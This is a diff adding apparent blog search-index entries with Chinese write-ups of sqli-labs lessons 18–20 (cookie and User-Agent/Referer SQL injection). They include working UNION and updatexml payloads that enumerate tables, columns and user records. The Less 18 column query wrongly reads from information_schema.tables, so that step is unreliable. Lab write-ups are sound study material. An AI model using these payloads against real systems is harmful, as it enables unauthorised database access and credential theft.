@@ -464,4 +464,78 @@ eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</
         <tag>sql注入</tag>
       </tags>
   </entry>
+  <entry>
+    <title>sqli-lab Less20</title>
+    <url>/2020/07/28/sqli-lab-Less20/</url>
+    <content><![CDATA[<p>Less -20</p>
+<pre><code>首先进行正常登陆</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/1.png" alt></p>
+<a id="more"></a>    
+
+<pre><code>通过bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/2.png" alt><br><img src="/2020/07/28/sqli-lab-Less20/3.png" alt></p>
+<pre><code>可以看到cookie被明文存放，刷新页面后发现cookie仍存在</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/4.png" alt></p>
+<pre><code>在cookie处测试</code></pre><p><img src="/2020/07/28/sqli-lab-Less20/5.png" alt></p>
+<pre><code>发现产生报错信息，从而判断此处为注入点。
+此处的后台流程为：
+1、登陆后将uname写入Cookie。
+2、在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。
+3、在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…
+由此我们可以使用union联合查询进行注入
+
+-判断字段数
+admin&apos; order by 4#
+
+-判断回显字段
+-admin&apos; union select 1,2,3#
+
+-查表
+-admin&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()#
+
+-查列
+-admin&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&apos;users&apos; #
+
+-查数据
+-admin&apos; union select 1,group_concat(username),3 from users #</code></pre>]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab Less(18-19)</title>
+    <url>/2020/07/28/sqli-lab-Less-18-19/</url>
+    <content><![CDATA[<p>Less -18<br>    这一关考察 Header Injection</p>
+<pre><code>直接bp抓包分析</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/1.png" alt></p>
+<a id="more"></a>
+
+<pre><code>可以看到将user-agent改为aaa,右侧的回显也是aaa</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/2.png" alt></p>
+<pre><code>加个单引号，可以看到发生了语法错误，证明这里存在注入点。
+
+接下来就是正常注入，这里不知道为什么，如果你用注释符这里会报错如：</code></pre><p><img src="/2020/07/28/sqli-lab-Less-18-19/3.png" alt></p>
+<pre><code>所以我只能用 &apos;1&apos; = &apos;1  进行闭合
+
+-查表
+aaa&apos; and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x3a),1) and &apos;1&apos; = &apos;1
+
+这里输出的数据被限制了，采用limit绕过
+
+aaa&apos; and updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
+
+-查列
+aaa&apos; and updatexml(1,concat(0x3a,(select column_name from information_schema.tables where table_name = &apos;users&apos; limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1
+
+-查数据
+aaa&apos; and updatexml(1,concat(0x3a,(select  username from users limit 0,1),0x3a),1) and &apos;1&apos; = &apos;1</code></pre><p>————分割线————–</p>
+<p>Less -19</p>
+<pre><code>19关与18相同，只是注入位置变为Referer其他条件不变</code></pre>]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>sqli-lab</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
 </search>
